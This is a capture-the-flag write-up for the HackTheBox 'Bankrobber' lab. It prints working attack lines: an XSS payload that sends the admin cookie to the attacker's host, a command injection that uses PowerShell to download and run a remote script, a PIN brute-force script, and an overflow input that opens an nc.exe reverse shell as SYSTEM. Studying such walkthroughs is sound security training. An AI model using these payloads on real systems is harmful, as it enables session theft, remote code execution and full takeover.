# Bankrobber - HackTheBox
## Windows - Insane

## User
There is a blind XXS in the transaction form. We can get the admin cookie with the payload `<script>x=new Image();x.src="http://[my-ip]/"+document.cookie</script>`. These give the credentials `admin:Hopelessromantic`. Login with these credentials get us to an admin page. There, one can run `dir` command but gets error that it needs to be run on `localhost`. Go back to the XSS and make admin run the post request:
```javascript
<script>
xh = new XMLHttpRequest();
xh.open('POST','/admin/backdoorchecker.php', true);
xh.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xh.send("cmd=dir | powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.175/shell.ps1?sinqdoubouturlenc')");
</script>
```
We have command injection by adding pipe `|`. Need to URL-encode with burp to make it work.
Get a shell as user `Cortin` on the box, and get the user flag.

## Root
There is an odd binary `bankv2.exe` in `C:\`. Look at `netstat` and see that it runs on `localhost:910`. Port forward with `chisel`:
```
kali$ ./chisel server -p 80 --reverse
Bankrobber>.\chisel.exe client [my-ip]:80 R:910:localhost:910
```

Then, doing `nc localhost 910` on our box, we get asked for a 4-digits PIN. Brute forcewith `brute.py`:
```python
import socket
import time

def trial(n):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('127.0.0.1', 910))
    s.recv(4096)
    print('{:04}'.format(n).encode())
    s.send('{:04}'.format(n).encode()+b'\n')
    resp = ""
    i=0
    while not resp:
        i+=1
        resp = s.recv(4096)
        if i==100000:return b''
    s.close()
    del s
    return resp

for i in range(0,10000):
    print(i)
    resp = trial(i)
    print(resp)
    if b"Access denied" not in resp and resp!=b'':
        print(i)
        print(resp)
        break
```


we get that the PIN is `0021`. Then the binary asks for a transfer amount and says that it executes `C:\users\admin\documents\transfer.exe`. Inputting many characters yields an overflow on the program it executes. So we can put a reverse shell in the transfer amount:
```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAc:\users\cortin\music\nc.exe 10.10.14.175 9007 -e powershell.exe
```
And we get a shell as `nt authority \ system`. Note that it works best on our machine with `chisel`. With nishang reverse shell or meterpreter, the output is screwed so it's harder to do the overflow.
